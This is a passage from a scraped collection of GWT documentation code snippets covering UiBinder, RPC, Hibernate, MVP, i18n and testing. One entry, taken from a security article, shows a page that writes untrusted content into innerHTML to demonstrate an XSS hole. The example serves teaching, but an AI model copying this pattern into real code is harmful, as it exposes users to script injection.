ContactsViewColumnDefinitions<ContactDetails> {\n    List<ColumnDefinition<ContactDetails>> columnDefinitions =\n      new ArrayList<ColumnDefinition<ContactDetails>>();\n\n    private ContactsViewColumnDefinitions() {\n      columnDefinitions.add(new ColumnDefinition<ContactDetails>() {\n        public Widget render(ContactDetails c) {\n          return new CheckBox();\n        }\n\n        public boolean isSelectable() {\n          return true;\n        }\n      });\n\n      columnDefinitions.add(new ColumnDefinition<ContactDetails>() {\n        public Widget render(ContactDetails c) {\n          return new HTML(c.getDisplayName());\n        }\n\n        public boolean isClickable() {\n          return true;\n        }\n      });\n    }\n\n    public List<ColumnDefinition<ContactDetails>> getColumnDefinitions() {\n      return columnDefinitions;\n    }\n  }\n```\n\n----------------------------------------\n\nTITLE: Configuring Generator for RemoteService in GWT Module XML\nDESCRIPTION: Shows the module XML configuration that defines a generator class for RemoteService interfaces. This instructs the GWT compiler to use the ServiceInterfaceProxyGenerator when processing RemoteService types.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsDeferred.md#2025-04-09_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<module>\n\n <!--  ... other configuration omitted ... -->\n\n <!-- Default warning for non-static, final fields enabled -->\n <set-property name=\"gwt.suppressNonStaticFinalFieldWarnings\" value=\"false\" />\n\n <generate-with class=\"com.google.gwt.user.rebind.rpc.ServiceInterfaceProxyGenerator\">\n   <when-type-assignable class=\"com.google.gwt.user.client.rpc.RemoteService\" />\n </generate-with>\n</module>\n```\n\n----------------------------------------\n\nTITLE: Original RadioButtons with Word Multiple Meanings\nDESCRIPTION: RadioButton elements where the word 'Orange' appears twice with different meanings (color and fruit).\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_18\n\nLANGUAGE: xml\nCODE:\n```\nFavorite Color:\n  <ui:RadioButton name=\"color\">Red</ui:RadioButton>\n  <ui:RadioButton name=\"color\">Orange</ui:RadioButton>\n\nFavorite Fruit:\n  <ui:RadioButton name=\"fruit\">Apple</ui:RadioButton>\n  <ui:RadioButton name=\"fruit\">Orange</ui:RadioButton>\n```\n\n----------------------------------------\n\nTITLE: Buggy StockPrice Change Percentage Calculation\nDESCRIPTION: Example of incorrect implementation of getChangePercent method used to demonstrate test failure scenarios.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JUnit.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic double getChangePercent() {\n  return 10.0 * this.change / this.price;\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Hibernate Mapping for Record in XML\nDESCRIPTION: Defines the Hibernate mapping for the Record class, specifying table name, id generator, and properties to be persisted.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<hibernate-mapping>\n  <class name=\"com.google.musicstore.domain.Record\" table=\"RECORD\">\n    <id name=\"id\" column=\"RECORD_ID\">\n      <generator class=\"native\"/>\n    </id>\n    <property name=\"title\"/>\n    <property name=\"year\"/>\n    <property name=\"price\"/>\n\n  </class>\n</hibernate-mapping>\n```\n\n----------------------------------------\n\nTITLE: Creating an Address POJO for Embedded Use in GWT RequestFactory\nDESCRIPTION: A plain Java object representing an Address that will be embedded within a Person entity. This class has no persistence annotations as it will be serialized within its parent entity.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic class Address {\n  private String street1;\n  private String street2;\n  private String city;\n  private String st;\n  private String zip;\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Changing Widget Background Color using DOM in GWT\nDESCRIPTION: This snippet demonstrates how to use the DOM to change the background color of a GWT widget by accessing its underlying element.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiDom.md#2025-04-09_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nprivate HTML htmlWidget;\n\n// Other code to instantiate the widget...\n\n// Change the description background color.\nhtmlWidget.getElement().getStyle().setBackgroundColor(\"#ffee80\");\n```\n\n----------------------------------------\n\nTITLE: Firing Events from Contact List Click Handler\nDESCRIPTION: Demonstrates how to fire an EditContactEvent when a user clicks on a contact in the list. The handler determines the selected row and fires the event with the corresponding contact ID.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter {\n  ...\n  display.getList().addClickHandler(new ClickHandler() {\n    public void onClick(ClickEvent event) {\n      int selectedRow = display.getClickedRow(event);\n\n      if (selectedRow >= 0) {\n        String id = contactDetails.get(selectedRow).getId();\n        eventBus.fireEvent(new EditContactEvent(id));\n      }\n    }\n  });\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Debug Logging in GWT Client-Side Code\nDESCRIPTION: This snippet demonstrates how to add debug logging to a GWT application using GWT.log(). The example shows logging a message when a button is clicked in the user interface.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nimport com.google.gwt.core.client.GWT;\n\n   ...\n\n   button.addClickHandler(new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        GWT.log(\"User Pressed a button.\", null); // Added debugging message\n        if (label.getText().equals(\"\"))\n          label.setText(\"Hello World!\");\n        else\n          label.setText(\"\");\n      }\n    });\n```\n\n----------------------------------------\n\nTITLE: Configuring Apache Proxy Pass for GWT Services\nDESCRIPTION: Apache configuration to proxy GWT RPC service requests from the main web server to a Tomcat instance. This allows static content to be served by Apache while routing service calls to Tomcat.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_10\n\nLANGUAGE: text\nCODE:\n```\nProxyPass        /MyApp/myapp/myService  http://servlet.example.com:8080/MyApp/myapp/myService\nProxyPassReverse /MyApp/myapp/myService  http://servlet.example.com:8080/MyApp/myapp/myService\n```\n\n----------------------------------------\n\nTITLE: Creating a Basic UiBinder XML Template\nDESCRIPTION: Defines the XML template for the Main class, containing just an empty HTMLPanel. This is the initial structure for the UI that will be later populated with menu items.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-buildui.md#2025-04-09_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n             xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n\n  <g:HTMLPanel>\n  </g:HTMLPanel>\n\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Original HTML with Attribute Needing Translation\nDESCRIPTION: Basic HTML structure with an attribute (title) that needs to be translated.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_16\n\nLANGUAGE: html\nCODE:\n```\n<th title=\"Gross receipts\">Gross</th>\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Script Tag for Relocated GWT Files\nDESCRIPTION: Example showing how to reference a relocated nocache.js file in the HTML host page when GWT application files are placed in a different location than the host page.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_DebuggingAndCompiling.md#2025-04-09_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<script language=\"JavaScript\" src=\"/gwt-files/MyApp.nocache.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Implementing Factorial Computation in Java\nDESCRIPTION: Java method to compute the factorial of a given number using recursion.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingCoverage.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nint computeFactorial(int number) {\n  if (number <= 1) {\n    return 1;\n  }\n  return number * computeFactorial(number - 1);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Clear Item Handlers in GWT\nDESCRIPTION: Java methods that handle the clear all and clear done menu item clicks. They provide functionality to remove all items or only the completed ones.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\n@UiHandler(\"menuClearAll\")\nprotected void menuClearAll(ClickEvent e) {\n  closeMenu();\n  content.clear();\n}\n\n@UiHandler(\"menuClearDone\")\nprotected void menuClearDone(ClickEvent e) {\n  closeMenu();\n  for (int i = content.getWidgetCount() - 1; i > -1; i--) {\n    Item item = (Item)content.getWidget(i);\n    if (item.isDone()) {\n        content.remove(item);\n    }\n  }\n}\n\nprivate void closeMenu() {\n  if (drawerPanel.getNarrow()) {\n    drawerPanel.closeDrawer();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting ARIA Role for CustomButton in GWT\nDESCRIPTION: This code snippet demonstrates how to set the ARIA role 'button' on a CustomButton widget during construction. It uses the GWT ARIA library to apply the appropriate role to the widget's DOM element.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideA11y.md#2025-04-09_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nprotected CustomButton() {\n    ...\n    // Add a11y role \"button\"\n    Roles.getButtonRole().set(getElement());\n    ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Advanced History Token Syntax for Stateful Applications\nDESCRIPTION: Example of a more robust history token format for stateful applications. This format includes both page information and session data to restore previous user state when navigating history.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsHistory.md#2025-04-09_snippet_3\n\nLANGUAGE: text\nCODE:\n```\npage=<pagename>;session=<sessionname>\n```\n\n----------------------------------------\n\nTITLE: Setting CSS to GSS Autoconversion in GWT\nDESCRIPTION: Configuration property to enable automatic conversion of CSS files to GSS during compilation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gss_migration.md#2025-04-09_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<set-configuration-property name=\"CssResource.conversionMode\" value=\"strict\" />\n```\n\n----------------------------------------\n\nTITLE: JUnit Test Failure Output\nDESCRIPTION: Detailed output from failed JUnit test execution showing assertion errors and stack trace.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JUnit.md#2025-04-09_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nTestsuite: com.google.gwt.sample.stockwatcher.client.StockWatcherTest\nTests run: 2, Failures: 1, Errors: 0, Time elapsed: 16.443 sec\n\nTestcase: testSimple took 16.238 sec\nTestcase: testStockPriceCtor took 0.155 sec\n  FAILED\nRemote test failed at 172.29.212.75 / Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1\n expected=2.857142857142857 actual=0.2857142857142857 delta=0.0010\njunit.framework.AssertionFailedError: Remote test failed at 172.29.212.75 / Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1\n expected=2.857142857142857 actual=0.2857142857142857 delta=0.0010\n  at com.google.gwt.sample.stockwatcher.client.StockWatcherTest.testStockPriceCtor(StockWatcherTest.java:38)\n  at com.google.gwt.sample.stockwatcher.client.__StockWatcherTest_unitTestImpl.doRunTest(__StockWatcherTest_unitTestImpl.java:7)\n  ...\n```\n\n----------------------------------------\n\nTITLE: Basic GWT Host Page Servlet Implementation\nDESCRIPTION: This example shows a simple servlet that generates an HTML host page for a GWT application. It sets the content type and character encoding before writing the HTML that includes the script reference to the GWT module.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dynamic_host_page.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic class GwtHostingServlet extends HttpServlet {\n\n @Override\n protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n\n   resp.setContentType(\"text/html\");\n   resp.setCharacterEncoding(\"UTF-8\");\n\n   // Print a simple HTML page including a <script> tag referencing your GWT module as the response\n   PrintWriter writer = resp.getWriter();\n   writer.append(\"<html><head>\")\n       .append(\"<script type=\\\"text/javascript\\\" src=\\\"sample/sample.nocache.js\\\"></script>\")\n       .append(\"</head><body><p>Hello, world!</p></body></html>\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Tagged HTML with ui:attribute for Translation\nDESCRIPTION: The HTML with ui:attribute added to indicate the title attribute needs translation, along with ui:msg for the element content.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_17\n\nLANGUAGE: xml\nCODE:\n```\n<th title=\"Gross receipts\">\n  <ui:attribute ui:name='title' ui:description='Tooltip text for gross column'/>\n  <ui:msg description='name of gross column'>Gross</ui:msg>\n</th>\n```\n\n----------------------------------------\n\nTITLE: JUnit Test Success Output\nDESCRIPTION: Example of successful JUnit test execution output showing test count and execution time.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JUnit.md#2025-04-09_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n[junit] Running com.google.gwt.sample.stockwatcher.client.StockWatcherTest\n[junit] Tests run: 2, Failures: 0, Errors: 0, Time elapsed: 16.601 sec\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Split Points in an Initial Load Sequence\nDESCRIPTION: Shows how to specify a sequence of multiple split points that should be loaded in order. This configuration is useful when the application has a predictable navigation path through several screens.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodeSplitting.md#2025-04-09_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<extend-configuration-property name=\"compiler.splitpoint.initial.sequence\"\n    value=\"com.yourcompany.yourprogram.SomeClass\"/>\n  <extend-configuration-property name=\"compiler.splitpoint.initial.sequence\"\n    value=\"com.yourcompany.yourprogram.AnotherClassClass\"/>\n  <extend-configuration-property name=\"compiler.splitpoint.initial.sequence\"\n    value=\"com.yourcompany.yourprogram.YetAnotherClass\"/>\n```\n\n----------------------------------------\n\nTITLE: Implementing Persistent Record Entity with Gilead\nDESCRIPTION: Record class implementation extending LightEntity for Gilead integration with Serializable interface.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_26\n\nLANGUAGE: java\nCODE:\n```\nimport net.sf.gilead.pojo.java5.LightEntity;\n\npublic class Account extends LightEntity implements Serializable {\n  // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Clearing HTML5 Storage with GWT UI Integration\nDESCRIPTION: Implements a clear all function that removes data from both UI and storage. Includes click handler setup and iterative row removal.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.storage.client.Storage;\nimport com.google.gwt.event.dom.client.ClickEvent;\nimport com.google.gwt.event.dom.client.ClickHandler;\nimport com.google.gwt.user.client.ui.Button;\nimport com.google.gwt.user.client.ui.FlexTable;\nimport com.google.gwt.user.client.ui.Widget;\n\n// Listen for mouse events on the Clear all button.\nclearAllButton.addClickHandler(new ClickHandler() {\n  public void onClick(ClickEvent event) {\n  // note that in general, events can have sources that are not Widgets.\n  Widget sender = (Widget) event.getSource();\n  //If HTML5 storage is supported, clear all rows from the FlexTable UI,\n  //then clear storage\n  if (sender == clearAllButton) {\n    stockStore = Storage.getLocalStorageIfSupported();\n    if (stockStore !=null) {\n      for (int ix =0; ix < stockStore.getLength(); ix++) {\n        stocksFlexTable.removeRow(1);\n      }\n\n      stockStore.clear();}\n    }\n  } // if sender is the clear all button\n});\n```\n\n----------------------------------------\n\nTITLE: Defining LoginService Interface for RPC (Java)\nDESCRIPTION: Interface definition for the LoginService, which extends RemoteService for GWT RPC functionality.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.user.client.rpc.RemoteService;\nimport com.google.gwt.user.client.rpc.RemoteServiceRelativePath;\n\n@RemoteServiceRelativePath(\"login\")\npublic interface LoginService extends RemoteService {\n  public LoginInfo login(String requestUri);\n}\n```\n\n----------------------------------------\n\nTITLE: Common GWT Module XML Elements\nDESCRIPTION: Shows core module XML elements for inherits, entry points, source paths, public paths, servlets, scripts, stylesheets, and client properties.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"_logical-module-name_\" />\n<entry-point class=\"_classname_\" />\n<source path=\"_path_\" />\n<public path=\"_path_\" />\n<servlet path=\"_url-path_\" class=\"_classname_\" />\n<script src=\"_js-url_\" />\n<stylesheet src=\"_css-url_\" />\n<extend-property name=\"_client-property-name_\" values=\"_comma-separated-values_\" />\n```\n\n----------------------------------------\n\nTITLE: Importing Ripple Effect Component in GWT Polymer Application\nDESCRIPTION: This final update to the EntryPoint class adds the PaperRippleElement to the imports list, ensuring the ripple effect component is loaded before the application starts. This enables the interactive ripple feedback on menu items.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.vaadin.polymer.Polymer;\nimport com.vaadin.polymer.elemental.Function;\n\npublic class TodoList implements EntryPoint {\n\n  public void onModuleLoad() {\n    // We have to load icon sets before run application\n    Polymer.importHref(Arrays.asList(\n          \"iron-icons/iron-icons.html\",\n           PaperIconItemElement.SRC,\n           IronIconElement.SRC,\n           PaperRippleElement.SRC), new Function() {\n      public Object call(Object arg) {\n        // The app is executed when all imports succeed.\n        startApplication();\n        return null;\n      }\n    });\n  }\n\n  private void startApplication() {\n    RootPanel.get().add(new Main());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating innerHTML XSS Vulnerability in HTML/JavaScript\nDESCRIPTION: A basic HTML page demonstrating how innerHTML can be exploited for XSS attacks through untrusted content injection.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n<html>\n<head>\n  <script language=\"JavaScript\">\n    function fillMyDiv(newContent) {\n      document.getElementById('mydiv').innerHTML = newContent;\n    }\n  </script>\n</head>\n<body>\n  <p>Some text before mydiv.</p>\n  <div id=\"mydiv\"></div>\n  <p>Some text after mydiv.</p>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Implementing Traditional Event Handling in GWT\nDESCRIPTION: Demonstrates the traditional verbose approach to implementing event handlers in GWT using anonymous inner classes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\npublic class MyFoo extends Composite {\n  Button button = new Button();\n\n  public MyFoo() {\n    button.addClickHandler(new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        handleClick();\n      }\n    });\n    initWidget(button);\n  }\n\n  void handleClick() {\n    Window.alert(\"Hello, AJAX\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Selection Handling in GWT Presenter\nDESCRIPTION: Presenter implementation showing selection model usage and item selection handling.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_16\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter implements Presenter,\n    ...\n    public void onItemSelected(ContactDetails contactDetails) {\n      if (selectionModel.isSelected(contactDetails)) {\n        selectionModel.removeSelection(contactDetails);\n      }\n\n      else {\n        selectionModel.addSelection(contactDetails);\n      }\n    }\n    ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Registering for History Events in GWT AppController\nDESCRIPTION: This code demonstrates how to register the AppController to receive History events by adding a ValueChangeHandler in the bind method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\npublic class AppController implements ValueChangeHandler<String> {\n  ...\n  private void bind() {\n    History.addValueChangeHandler(this);\n    ...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Web.xml for LoginService Servlet (XML)\nDESCRIPTION: XML configuration in web.xml file to map the LoginService servlet for the StockWatcher application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_15\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<web-app>\n\n  <!-- Default page to serve -->\n  <welcome-file-list>\n    <welcome-file>StockWatcher.html</welcome-file>\n  </welcome-file-list>\n\n  <!-- Servlets -->\n  <servlet>\n    <servlet-name>loginService</servlet-name>\n    <servlet-class>com.google.gwt.sample.stockwatcher.server.LoginServiceImpl</servlet-class>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>loginService</servlet-name>\n    <url-pattern>/stockwatcher/login</url-pattern>\n  </servlet-mapping>\n\n</web-app>\n```\n\n----------------------------------------\n\nTITLE: Basic GWT Hello World Implementation Without Code Splitting\nDESCRIPTION: Shows a simple GWT EntryPoint implementation with a button click handler that displays an alert. This represents the base example before applying code splitting.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodeSplitting.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic class Hello implements EntryPoint {\n  public void onModuleLoad() {\n    Button b = new Button(\"Click me\", new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        Window.alert(\"Hello, AJAX\");\n      }\n    });\n\n    RootPanel.get().add(b);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking User Authentication with GWT-RPC in onModuleLoad Method\nDESCRIPTION: This snippet demonstrates the basic RPC approach for checking if a user is logged in when the GWT module loads. It makes a service call and redirects to a login page if the user is not authenticated.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dynamic_host_page.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic void onModuleLoad() {\n  // loginService is a GWT-RPC service that checks if the user is logged in\n  loginService.checkLoggedIn(new AsyncCallback<Boolean> {\n    public void onSuccess(Boolean loggedIn) {\n      if (loggedIn) {\n        showApp();\n      } else {\n        Window.Location.assign(\"/login\");\n      }\n    }\n    // ...onFailure()\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Original HTMLPanel with Widgets\nDESCRIPTION: HTMLPanel containing TimePicker widgets that will need to be handled during internationalization.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_10\n\nLANGUAGE: xml\nCODE:\n```\n<g:HTMLPanel>\n  Meeting starts at\n    <my:TimePicker ui:field=\"startPicker\"/>\n  and ends at\n    <my:TimePicker ui:field=\"endPicker\"/>.\n</g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: Configuring Initial Load Sequence in GWT Module File\nDESCRIPTION: Demonstrates how to specify an initial load sequence for split points using the extend-configuration-property tag in a GWT module file. This prioritizes loading specific split points in a predetermined order.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodeSplitting.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<extend-configuration-property name=\"compiler.splitpoint.initial.sequence\"\n    value=\"com.yourcompany.yourprogram.SomeClass\"/>\n```\n\n----------------------------------------\n\nTITLE: Using ClientBundle Resources in GWT Application\nDESCRIPTION: Code demonstrating how to use resources from a ClientBundle instance, including injecting CSS and displaying a PDF in an iframe.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n  // Inject the contents of the CSS file\n  MyResources.INSTANCE.css().ensureInjected();\n\n  // Display the manual file in an iframe\n  new Frame(MyResources.INSTANCE.ownersManual().getSafeUri().asString());\n```\n\n----------------------------------------\n\nTITLE: Removing Stocks in GWT Application\nDESCRIPTION: Methods for removing stock symbols from the datastore and display table using async service calls.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_28\n\nLANGUAGE: java\nCODE:\n```\nprivate void displayStock(final String symbol) {\n\n  ...\n\n    // Add a button to remove this stock from the table.\n    Button removeStock = new Button(\"x\");\n    removeStock.addStyleDependentName(\"remove\");\n\n    removeStock.addClickHandler(new ClickHandler(){\n      public void onClick(ClickEvent event) {\n        removeStock(symbol);\n      }\n    });\n    stocksFlexTable.setWidget(row, 3, removeStock);\n\n    // Get the stock price.\n    refreshWatchList();\n\n  }\n\n  private void removeStock(final String symbol) {\n    stockService.removeStock(symbol, new AsyncCallback<Void>() {\n      public void onFailure(Throwable error) {\n      }\n      public void onSuccess(Void ignore) {\n        undisplayStock(symbol);\n      }\n    });\n  }\n\n  private void undisplayStock(String symbol) {\n    int removedIndex = stocks.indexOf(symbol);\n    stocks.remove(removedIndex);\n    stocksFlexTable.removeRow(removedIndex+1);\n  }\n```\n\n----------------------------------------\n\nTITLE: Module Entry Point with JSNI Implementation\nDESCRIPTION: Example showing how to access JavaScript objects using overlay types in a GWT module entry point.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsOverlay.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass MyModuleEntryPoint implements EntryPoint {\n  public void onModuleLoad() {\n    Customer c = getFirstCustomer();\n    // Yay! Now I have a JS object that appears to be a Customer\n    Window.alert(\"Hello, \" + c.getFirstName());\n  }\n\n  // Use JSNI to grab the JSON object we care about\n  // The JSON object gets its Java type implicitly\n  // based on the method's return type\n  private native Customer getFirstCustomer() /*-{\n    // Get a reference to the first customer in the JSON array from earlier\n    return $wnd.jsonData[0];\n  }-*/;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Refresh Interval Constant in GWT StockWatcher\nDESCRIPTION: Defines a constant for the refresh interval in milliseconds (5000ms or 5 seconds). This constant is used with the Timer to determine how frequently the stock data should be updated.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic class StockWatcher implements EntryPoint {\n\nprivate static final int REFRESH_INTERVAL = 5000; // ms\nprivate VerticalPanel mainPanel = new VerticalPanel();\n```\n\n----------------------------------------\n\nTITLE: CSS Selector Merging Example in GWT\nDESCRIPTION: Demonstrates how GWT's CssResource optimizer merges rules with identical selectors to reduce CSS size. Shows the input CSS with separate rules for the same selector.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_27\n\nLANGUAGE: css\nCODE:\n```\n.div {prop: value;}\n.div {foo: bar;}\n```\n\n----------------------------------------\n\nTITLE: Updating Table Method with StockData in Java\nDESCRIPTION: Modified updateTable method to handle StockData objects instead of StockPrice objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\nprivate void updateTable(StockData price) {\n  if (!stocks.contains(price.getSymbol())) {\n    return;\n  }\n\n  ...\n\n}\n```\n\n----------------------------------------\n\nTITLE: Field-Based Editor Implementation in GWT\nDESCRIPTION: Shows how to implement editors using package-visible fields with direct property mapping and editor naming conventions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiEditors.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass MyEditor implements Editor<Foo> {\n  // Edits the Foo.getBar() property\n  BarEditor bar;\n  // Edits the Foo.getBaz() property\n  BazEditor bazEditor;\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Default Locale in GWT Module XML\nDESCRIPTION: Configuration to set a default locale and remove the default 'default' locale permutation, with English as fallback.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nLocale.md#2025-04-09_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<extend-property name=\"locale\" values=\"en,es,de,fr,it\" /> <!-- 1. full list of supported locales --> \n<set-property name=\"locale\" value=\"en,es,de,fr,it\" />     <!-- 2. remove the 'default' locale permutation -->\n<set-property-fallback name=\"locale\" value=\"en\" />        <!-- 3. set the fallback locale, in replacement for the default 'default' locale -->\n```\n\n----------------------------------------\n\nTITLE: Implementing Error Display Method in Java\nDESCRIPTION: Method to display error messages using a Label widget in GWT StockWatcher. Sets error text and makes the label visible to the user.\nSOURCE: 